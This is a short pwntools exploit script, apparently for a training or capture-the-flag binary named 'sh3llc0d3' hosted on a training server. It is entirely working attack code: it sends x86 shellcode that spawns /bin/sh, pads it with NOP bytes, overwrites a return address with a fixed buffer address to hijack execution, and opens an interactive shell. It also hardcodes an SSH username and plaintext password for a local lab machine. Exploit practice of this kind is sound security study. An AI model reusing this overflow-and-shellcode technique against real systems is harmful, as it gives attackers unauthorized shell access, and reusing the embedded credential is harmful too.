from pwn import *

if "REMOTE" not in args:
    ssh = ssh("buba98", "127.0.0.1", password="Vinsent22!", port=2222)
    r = ssh.process("/home/buba98/sh3llc0d3")
    gdb.attach(r, """
        # b *0x0804841c
        # c
        """)

    input("wait")
else:
    r = remote("bin.training.jinblack.it", 2002)

r.recvuntil(b"What is your name?")

payload = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

payload = payload.ljust(212, b"\x90")

payload += p32(0x804c060)

payload = payload.ljust(1008, b"B")

r.send(payload)

r.interactive()
